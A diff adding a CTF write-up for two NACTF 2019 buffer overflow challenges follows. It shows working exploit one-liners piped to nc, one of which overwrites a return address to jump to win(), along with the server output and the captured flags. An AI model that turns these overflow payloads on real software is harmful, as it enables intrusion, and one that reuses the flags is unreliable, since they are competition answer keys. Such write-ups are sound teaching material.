@@ -319,3 +319,70 @@ We can easily calculate **X** from v3.
 `nactf{xxxxxxxx}`
 
 
+***
+# [Binary Exploitation]
+***
+
+## BufferOverflow #0 (100)
+
+#### Description
+> The close cousin of a website for "Question marked as duplicate".
+Can you cause a segfault and get the flag?
+
+> shell.2019.nactf.com:31475
+
+#### Hint
+> What does it mean to overflow the buffer?
+
+#### File
+- [bufover-0](Files/bufover-0)
+- [bufover-0.c](Files/bufover-0.c)
+
+#### Solution
+Our target is to call function **win()**. We have a call to **signal()**, it will call **win()** whenever SIGSEGV error occurs.
+```c
+signal(SIGSEGV, win);
+```
+So, we just need to send a long input to cause SIGSEGV
+```bash
+$ python -c "print 'A'*100" | nc shell.2019.nactf.com 31475
+Type something>You typed AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+You win!
+flag: nactf{0v3rfl0w_th4at_buff3r_18ghKusB}
+```
+
+#### Flag
+`nactf{0v3rfl0w_th4at_buff3r_18ghKusB}`
+
+
+
+## BufferOverflow #1 (200)
+
+#### Description
+> The close cousin of a website for "Question marked as duplicate" - part 2!
+Can you redirect code execution and get the flag?
+
+> Connect at shell.2019.nactf.com:31462
+
+#### Hint
+> pwntools can help you with crafting payloads
+
+#### File
+- [bufover-1](Files/bufover-1)
+- [bufover-1.c](Files/bufover-1.c)
+
+#### Solution
+Now we have to overwrite the **return address** of func **vuln()** to func **win()**. So after func **vuln()** finish, we will return to func **win()** and got flag.
+First, I use **radare2** tool to find address of func **win()**. That is **0x080491b2**
+Second, we need the offset of **return address**. `buf` in **vuln()** is at `ebp-0x18`. So, return address will be at offset `0x18 + 4` (4 bytes for Saved BP) from `buf`.
+Finally, we got payload like this:
+
+```bash
+python -c "print 'A'*0x18 + 'B'*4 + '\xb2\x91\x04\x08'" | nc  shell.2019.nactf.com 31462
+Type something>You typed AAAAAAAAAAAAAAAAAAAAAAAABBBB�!
+You win!
+flag: nactf{pwn_31p_0n_r3t_iNylg281}
+```
+
+#### Flag
+`nactf{pwn_31p_0n_r3t_iNylg281}`
